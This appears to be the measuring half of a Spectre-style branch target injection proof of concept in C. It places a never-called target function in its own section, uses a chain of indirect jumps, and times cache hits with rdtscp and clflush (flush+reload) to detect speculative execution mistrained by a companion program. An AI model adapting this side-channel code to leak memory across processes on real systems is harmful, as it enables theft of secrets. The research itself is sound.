#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>



//void funcfoo(void) __attribute__((section(".funcfoo")));
//void funcbar(void) __attribute__((section(".funcbar")));

unsigned int junk=0;

// Put this in its own (4KB) page
uint8_t probe_buf[4096*256];


/*
 * This function is NEVER CALLED in measure.c
 * but if it is speculatively executed,
 * (because of a sucessful mistrain by inject.c)
 * then we'll load probe_buf[100] into cache
 */
void target_fn(void) __attribute__((section(".targetfn")));
void target_fn(void) {
    asm volatile ( "movb (%%rbx), %%al\n" :: "b"((uint8_t*)&probe_buf[100*4096]) : "rax");
}

// Keep stats
uint64_t cache_hits = 0;    // Basically number of times target_fn was speculatively executed
uint64_t tot_runs = 0;


void test() {
    uint64_t t0, t1;
    uint8_t *addr = &probe_buf[100*4096];
    t0 = _rdtscp(&junk);
    asm volatile( "movb (%%rbx), %%al\n"
            :: "b"(addr) : "rax");
    t1 = _rdtscp(&junk);
    if (t1-t0 < 140) {
        cache_hits++;
        //printf("# %lu\n", t1-t0);
    }
    tot_runs++;

    // Clear probe_buf from cache
    int i;
    for (i=0; i<256; i++) {
        _mm_clflush(&probe_buf[i*4096]);
    }
}

void __attribute__((section(".fnptr"))) (*fn_ptr)(void); // we'll set this = test, and cflush it
uint64_t jmp_ptr;
uint64_t jmp_offset;

// Place this at the address of the function that will be doing an indirect call
// (measure)
void indirect(void) __attribute__((section(".indirect")));
void indirect(void) {
    // do our indirect jump
    // 16 taken (conditional?) branches...
    // HACK: relative jmp is 2 bytes (74 00 is "je foo\nfoo:")
    // If you want these to all be taken, set rax=0x11
    // otherwise there will be 16 not-taken branches
    asm volatile (
            "jmp call_get_rip\n"
        "get_rip:\n"
            "pop %%rax\n" // rax = rip
            "push %%rax\n"
            "ret\n"
        "call_get_rip:\n"
            "call get_rip\n"

            "add (%%rbx), %%rax\n"
            "add $9, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            :: "a"(0x02), "b"(&jmp_offset) : "rcx");

    // Do indirect jump
    (*fn_ptr)();
}


void measure() {
    fn_ptr = test;
    //jmp_ptr = 0x400a5d;   // With je +2's
    jmp_ptr = 0x400a1b;
    jmp_offset = 0;
    int i;
    while (1) {
        for (i=0; i<10000; i++) {
            _mm_clflush(fn_ptr);
            _mm_clflush(&jmp_offset);
            indirect();
            usleep(1);
        }
        printf("%lu / %lu = %0.5f%% hits\n", cache_hits, tot_runs, 100*((float)cache_hits)/((float)tot_runs));
        cache_hits = 0;
        tot_runs = 0;
    }


}

void funcbar() {
    printf("hello from funcbar\n");
}

int main()
{
    uint64_t x;

    //printf("funcfoo = %p\n", funcfoo);
    //printf("funcfoo = %p\n", funcbar);
    printf("&x = %p\n", &x);

    fn_ptr = test;
    printf("test() @ %p\n", test);
    printf("indirect jump ptr = %p\n", fn_ptr);
    printf("indirect fn = %p\n", indirect);

    printf("target_fn = %p\n", target_fn);
    printf("probe_buf: %p\n", probe_buf);
    printf("&probe_buf[100*4096]: %p\n", &probe_buf[100*4096]);

    printf("measuring...\n");

    measure();

    printf("[+] Success!\n");

    //funcfoo();
    //funcbar();
}
